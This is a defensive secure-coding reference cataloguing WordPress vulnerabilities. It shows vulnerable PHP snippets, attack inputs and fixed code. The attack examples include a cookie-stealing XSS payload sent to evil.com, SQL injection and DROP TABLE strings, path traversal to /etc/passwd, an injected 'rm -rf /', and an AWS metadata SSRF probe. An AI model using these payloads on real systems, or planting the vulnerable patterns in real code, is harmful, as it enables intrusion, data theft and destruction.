# WordPress Vulnerability Reference

Comprehensive catalog of WordPress-specific vulnerabilities and their patterns.

## Quick Lookup Table

| Vulnerability | Detection Pattern | Risk Level |
|--------------|-------------------|------------|
| SQL Injection | `$wpdb->query()` without `prepare()` | Critical |
| Reflected XSS | `echo $_GET` without `esc_html()` | Critical |
| Stored XSS | Unescaped database content output | Critical |
| CSRF | Form handlers without nonce verification | Critical |
| Authentication Bypass | Missing `current_user_can()` | Critical |
| Object Injection | `unserialize()` with user input | Critical |
| Remote Code Execution | `eval()`, `assert()`, `create_function()` | Critical |
| Local File Inclusion | `include` with user-controlled path | Critical |
| Remote File Inclusion | `include` with external URL | Critical |
| Path Traversal | File operations with `../` in path | Critical |
| SSRF | `wp_remote_get()` with user URL | High |
| IDOR | Resource access without ownership check | High |
| Privilege Escalation | Role/capability manipulation | High |
| Open Redirect | `wp_redirect()` with user URL | Medium |
| Information Disclosure | Debug output, version exposure | Medium |
| Session Fixation | Custom session handling | Medium |

---

## 1. SQL Injection Vulnerabilities

### 1.1 Direct Query Injection

```php
// ❌ CRITICAL: Direct concatenation.
$id = $_GET['id'];
$wpdb->query( "DELETE FROM {$wpdb->posts} WHERE ID = $id" );

// Attack: ?id=1 OR 1=1
// Result: Deletes all posts.

// ✅ GOOD: Parameterized query.
$id = intval( $_GET['id'] );
$wpdb->query(
    $wpdb->prepare(
        "DELETE FROM {$wpdb->posts} WHERE ID = %d",
        $id
    )
);
```

### 1.2 Second-Order SQL Injection

```php
// ❌ CRITICAL: Trusting data from database.
$user_data = get_user_meta( $user_id, 'custom_query', true );
$wpdb->query( "SELECT * FROM table WHERE $user_data" );

// Attack: Attacker sets meta to: 1=1; DROP TABLE wp_users; --
// Result: Database destruction.

// ✅ GOOD: Validate and sanitize stored data.
$allowed_columns = array( 'name', 'email', 'date' );
$column = get_user_meta( $user_id, 'sort_column', true );
if ( ! in_array( $column, $allowed_columns, true ) ) {
    $column = 'name';
}
$wpdb->query(
    $wpdb->prepare(
        "SELECT * FROM table ORDER BY {$column} LIMIT %d",
        10
    )
);
```

### 1.3 ORDER BY Injection

```php
// ❌ CRITICAL: ORDER BY with user input.
$orderby = $_GET['orderby'];
$order   = $_GET['order'];
$wpdb->get_results(
    "SELECT * FROM {$wpdb->posts} ORDER BY $orderby $order"
);

// Attack: ?orderby=IF(1=1,title,content)&order=ASC
// Result: Boolean-based blind SQL injection.

// ✅ GOOD: Whitelist ORDER BY columns and directions.
$allowed_orderby = array( 'post_title', 'post_date', 'ID' );
$allowed_order   = array( 'ASC', 'DESC' );

$orderby = in_array( $_GET['orderby'], $allowed_orderby, true )
    ? $_GET['orderby']
    : 'post_date';
$order = in_array( strtoupper( $_GET['order'] ), $allowed_order, true )
    ? strtoupper( $_GET['order'] )
    : 'DESC';

$wpdb->get_results(
    $wpdb->prepare(
        "SELECT * FROM {$wpdb->posts} ORDER BY {$orderby} {$order} LIMIT %d",
        10
    )
);
```

### 1.4 IN Clause Injection

```php
// ❌ CRITICAL: User-controlled IN clause.
$ids = $_GET['ids']; // "1,2,3"
$wpdb->get_results(
    "SELECT * FROM {$wpdb->posts} WHERE ID IN ($ids)"
);

// Attack: ?ids=1) OR 1=1 --
// Result: Returns all posts.

// ✅ GOOD: Sanitize each ID and build safe IN clause.
$ids = array_map( 'intval', explode( ',', $_GET['ids'] ) );
$ids = array_filter( $ids ); // Remove zeros.

if ( empty( $ids ) ) {
    return array();
}

$placeholders = implode( ', ', array_fill( 0, count( $ids ), '%d' ) );
$wpdb->get_results(
    $wpdb->prepare(
        "SELECT * FROM {$wpdb->posts} WHERE ID IN ($placeholders)",
        $ids
    )
);
```

---

## 2. Cross-Site Scripting (XSS)

### 2.1 Reflected XSS

```php
// ❌ CRITICAL: Direct reflection of input.
<h1>Search results for: <?php echo $_GET['s']; ?></h1>

// Attack: ?s=<script>document.location='http://evil.com/?c='+document.cookie</script>
// Result: Cookie theft.

// ✅ GOOD: Escape for HTML context.
<h1>Search results for: <?php echo esc_html( $_GET['s'] ); ?></h1>
```

### 2.2 Stored XSS

```php
// ❌ CRITICAL: Unescaped database content.
$comment = get_comment_text( $comment_id );
echo "<div class='comment'>$comment</div>";

// Attack: Stored comment contains: <img src=x onerror=alert(1)>
// Result: XSS executes for all viewers.

// ✅ GOOD: Escape even "trusted" database content.
$comment = get_comment_text( $comment_id );
echo "<div class='comment'>" . esc_html( $comment ) . "</div>";

// Or allow safe HTML.
echo "<div class='comment'>" . wp_kses_post( $comment ) . "</div>";
```

### 2.3 DOM-Based XSS

```javascript
// ❌ CRITICAL: Inserting URL parameters into DOM.
document.getElementById('output').innerHTML =
    new URLSearchParams(window.location.search).get('msg');

// Attack: ?msg=<img src=x onerror=alert(1)>
// Result: XSS via DOM manipulation.

// ✅ GOOD: Use textContent or sanitize.
document.getElementById('output').textContent =
    new URLSearchParams(window.location.search).get('msg');
```

### 2.4 Attribute Context XSS

```php
// ❌ CRITICAL: Wrong escaping function.
<input type="text" value="<?php echo esc_html( $value ); ?>">

// Attack: $value = '" onclick="alert(1)"'
// Result: Event handler injection (esc_html doesn't escape quotes properly for attributes).

// ✅ GOOD: Use esc_attr for attributes.
<input type="text" value="<?php echo esc_attr( $value ); ?>">
```

### 2.5 JavaScript Context XSS

```php
// ❌ CRITICAL: Unescaped data in JavaScript.
<script>
var userData = <?php echo json_encode( $user_data ); ?>;
</script>

// ✅ GOOD: Use wp_json_encode and proper escaping.
<script>
var userData = <?php echo wp_json_encode( $user_data ); ?>;
</script>

// Or use wp_add_inline_script for complex data.
wp_localize_script( 'my-script', 'myData', array(
    'user' => $user_data,
    'nonce' => wp_create_nonce( 'my_action' ),
) );
```

---

## 3. Cross-Site Request Forgery (CSRF)

### 3.1 Missing Nonce on Form

```php
// ❌ CRITICAL: No CSRF protection.
if ( isset( $_POST['delete_account'] ) ) {
    wp_delete_user( get_current_user_id() );
}

// Attack: <img src="https://victim.com/profile.php?delete_account=1">
// Result: Account deletion via forged request.

// ✅ GOOD: Verify nonce on all state-changing requests.
if ( isset( $_POST['delete_account'] ) ) {
    if ( ! wp_verify_nonce( $_POST['_wpnonce'], 'delete_account_action' ) ) {
        wp_die( 'Security check failed' );
    }
    wp_delete_user( get_current_user_id() );
}

// In form.
<form method="post">
    <?php wp_nonce_field( 'delete_account_action' ); ?>
    <button name="delete_account">Delete My Account</button>
</form>
```

### 3.2 Predictable Nonce

```php
// ❌ WARNING: Nonce with no action specificity.
wp_nonce_field( 'generic' );

// Attack: If any form uses 'generic', nonce is reusable.

// ✅ GOOD: Specific nonce actions.
wp_nonce_field( 'delete_post_' . $post_id );
```

### 3.3 Nonce in GET Request

```php
// ❌ WARNING: Nonce exposed in URL.
<a href="?action=delete&id=123&_wpnonce=<?php echo wp_create_nonce( 'delete' ); ?>">
    Delete
</a>

// Risk: URL may be logged, cached, or leaked via Referer header.

// ✅ GOOD: Use POST for state-changing actions.
<form method="post" style="display:inline;">
    <?php wp_nonce_field( 'delete_post_' . $post_id ); ?>
    <input type="hidden" name="post_id" value="<?php echo $post_id; ?>">
    <button type="submit" name="action" value="delete">Delete</button>
</form>
```

---

## 4. Authorization Vulnerabilities

### 4.1 Missing Capability Check

```php
// ❌ CRITICAL: No authorization check.
function delete_user_handler() {
    $user_id = intval( $_POST['user_id'] );
    wp_delete_user( $user_id );
}
add_action( 'wp_ajax_delete_user', 'delete_user_handler' );

// Attack: Any logged-in user can delete any user.

// ✅ GOOD: Verify capabilities.
function delete_user_handler() {
    check_ajax_referer( 'delete_user_nonce', 'security' );

    if ( ! current_user_can( 'delete_users' ) ) {
        wp_send_json_error( 'Unauthorized', 403 );
    }

    $user_id = intval( $_POST['user_id'] );
    wp_delete_user( $user_id );
    wp_send_json_success();
}
```

### 4.2 Insecure Direct Object Reference (IDOR)

```php
// ❌ CRITICAL: No ownership verification.
function get_invoice() {
    $invoice_id = intval( $_GET['id'] );
    return get_post( $invoice_id );
}

// Attack: Change ?id=123 to ?id=456 to access other users' invoices.

// ✅ GOOD: Verify ownership or permissions.
function get_invoice() {
    $invoice_id = intval( $_GET['id'] );
    $invoice    = get_post( $invoice_id );

    if ( ! $invoice ) {
        wp_die( 'Invoice not found' );
    }

    // Check ownership.
    if ( $invoice->post_author !== get_current_user_id()
        && ! current_user_can( 'manage_options' )
    ) {
        wp_die( 'Unauthorized access' );
    }

    return $invoice;
}
```

### 4.3 Privilege Escalation

```php
// ❌ CRITICAL: User can set their own role.
$role = sanitize_text_field( $_POST['role'] );
wp_update_user( array(
    'ID'   => get_current_user_id(),
    'role' => $role,
) );

// Attack: POST role=administrator
// Result: User becomes admin.

// ✅ GOOD: Don't allow users to change their own role.
// Or restrict to allowed roles with capability check.
if ( current_user_can( 'promote_users' ) ) {
    $allowed_roles = array( 'subscriber', 'contributor' );
    $role = sanitize_text_field( $_POST['role'] );
    if ( in_array( $role, $allowed_roles, true ) ) {
        // Safe to update.
    }
}
```

---

## 5. Object Injection

```php
// ❌ CRITICAL: Deserializing user input.
$data = unserialize( base64_decode( $_COOKIE['user_prefs'] ) );

// Attack: Crafted serialized object triggers __destruct or __wakeup.
// Result: Remote code execution via gadget chain.

// ✅ GOOD: Use JSON instead.
$data = json_decode( $_COOKIE['user_prefs'], true );
if ( ! is_array( $data ) ) {
    $data = array();
}

// Or if you must use serialization, use allowed classes (PHP 7+).
$data = unserialize(
    $input,
    array( 'allowed_classes' => false )
);
```

---

## 6. File Operation Vulnerabilities

### 6.1 Path Traversal

```php
// ❌ CRITICAL: User-controlled file path.
$file = $_GET['template'];
include "/var/www/templates/$file";

// Attack: ?template=../../../etc/passwd
// Result: Local file disclosure.

// ✅ GOOD: Validate against whitelist.
$allowed = array( 'header.php', 'footer.php', 'sidebar.php' );
$file    = basename( $_GET['template'] ); // Strips path.
if ( in_array( $file, $allowed, true ) ) {
    include get_template_directory() . '/' . $file;
}
```

### 6.2 Arbitrary File Upload

```php
// ❌ CRITICAL: No file validation.
move_uploaded_file(
    $_FILES['avatar']['tmp_name'],
    ABSPATH . 'uploads/' . $_FILES['avatar']['name']
);

// Attack: Upload avatar.php with webshell code.
// Result: Remote code execution via /uploads/avatar.php.

// ✅ GOOD: Validate type, rename file, use WordPress functions.
$allowed_types = array( 'image/jpeg', 'image/png', 'image/gif' );
$finfo         = finfo_open( FILEINFO_MIME_TYPE );
$mime          = finfo_file( $finfo, $_FILES['avatar']['tmp_name'] );

if ( ! in_array( $mime, $allowed_types, true ) ) {
    wp_die( 'Invalid file type' );
}

// Use WordPress upload handling.
require_once ABSPATH . 'wp-admin/includes/file.php';
$upload = wp_handle_upload(
    $_FILES['avatar'],
    array( 'test_form' => false )
);

if ( isset( $upload['error'] ) ) {
    wp_die( $upload['error'] );
}
```

---

## 7. Remote Code Execution

### 7.1 Eval Injection

```php
// ❌ CRITICAL: Dynamic code execution.
$formula = $_POST['formula'];
eval( '$result = ' . $formula . ';' );

// Attack: POST formula=system('whoami')
// Result: Command execution.

// ✅ GOOD: Use a safe expression parser or whitelist operations.
$allowed_ops = array( '+', '-', '*', '/' );
$formula     = preg_replace( '/[^0-9+\-*\/\s]/', '', $_POST['formula'] );
// Still risky - better to use a dedicated math library.
```

### 7.2 Command Injection

```php
// ❌ CRITICAL: Shell command with user input.
$filename = $_GET['file'];
system( "convert $filename output.png" );

// Attack: ?file=;rm -rf /
// Result: Server destruction.

// ✅ GOOD: Escape shell arguments.
$filename = escapeshellarg( $_GET['file'] );
system( "convert $filename output.png" );

// Better: Avoid shell commands entirely.
// Use PHP libraries or WordPress functions instead.
```

---

## 8. Server-Side Request Forgery (SSRF)

```php
// ❌ CRITICAL: Fetching arbitrary URLs.
$url      = $_GET['url'];
$response = wp_remote_get( $url );

// Attack: ?url=http://169.254.169.254/latest/meta-data/
// Result: AWS metadata exposure (credentials, tokens).

// Attack: ?url=file:///etc/passwd
// Result: Local file read (if stream wrappers enabled).

// ✅ GOOD: Validate URL host against whitelist.
$url       = esc_url_raw( $_GET['url'] );
$parsed    = wp_parse_url( $url );
$whitelist = array( 'api.trusted.com', 'cdn.trusted.com' );

if ( ! isset( $parsed['host'] )
    || ! in_array( $parsed['host'], $whitelist, true )
    || ! in_array( $parsed['scheme'], array( 'http', 'https' ), true )
) {
    wp_die( 'Invalid URL' );
}

$response = wp_remote_get( $url, array(
    'timeout'     => 5,
    'redirection' => 0, // Prevent redirect bypass.
) );
```

---

## 9. Security Misconfiguration

### 9.1 Debug Mode in Production

```php
// ❌ WARNING: Debug enabled in production.
define( 'WP_DEBUG', true );
define( 'WP_DEBUG_DISPLAY', true );

// Result: Stack traces, file paths, query info exposed.

// ✅ GOOD: Disable debug display, log instead.
define( 'WP_DEBUG', true );
define( 'WP_DEBUG_DISPLAY', false );
define( 'WP_DEBUG_LOG', true );
```

### 9.2 Directory Listing

```php
// ❌ WARNING: Uploads directory listable.
// http://example.com/wp-content/uploads/ shows file listing.

// ✅ GOOD: Add index.php or .htaccess to prevent listing.
// wp-content/uploads/index.php
<?php
// Silence is golden.

// Or in .htaccess.
Options -Indexes
```

### 9.3 Sensitive Files Accessible

```php
// ❌ WARNING: Config backups accessible.
// http://example.com/wp-config.php.bak
// http://example.com/.git/

// ✅ GOOD: Block access in .htaccess.
<FilesMatch "(?i)(^\.git|^\.env|\.bak$|\.log$|\.sql$|\.tar$|\.gz$)">
    Require all denied
</FilesMatch>
```

---

## Security Checklist

### Input Handling
- [ ] All `$_GET`, `$_POST`, `$_REQUEST` sanitized
- [ ] All database output escaped
- [ ] File paths validated against whitelist
- [ ] URLs validated for scheme and host

### Authentication & Authorization
- [ ] Nonces on all forms and AJAX
- [ ] `current_user_can()` before privileged actions
- [ ] Ownership verified for user-specific resources
- [ ] REST endpoints have `permission_callback`

### Database Operations
- [ ] `$wpdb->prepare()` for all variable queries
- [ ] `$wpdb->esc_like()` for LIKE patterns
- [ ] ORDER BY columns whitelisted
- [ ] IN clauses properly sanitized

### File Operations
- [ ] Upload file types validated by MIME
- [ ] File paths use `basename()` or whitelist
- [ ] No user input in `include`/`require`
- [ ] Upload directory has .htaccess protection

### Configuration
- [ ] `WP_DEBUG_DISPLAY` is `false` in production
- [ ] Directory listing disabled
- [ ] Sensitive files blocked from access
- [ ] Security headers configured
